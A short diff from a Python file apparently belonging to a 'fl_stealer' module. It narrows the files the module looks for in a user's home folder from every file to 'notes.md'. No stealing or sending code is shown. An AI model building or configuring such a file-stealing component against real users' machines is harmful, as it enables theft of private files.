@@ -7,7 +7,7 @@ import re
 
 custom_paths = ["/home/pawel/custom_folder"]
 special_paths = ["DOC"]
-files_to_find = [".*"]
+files_to_find = ["notes.md"]
 module_name = "fl_stealer module"
 pub_key_size = 16
 
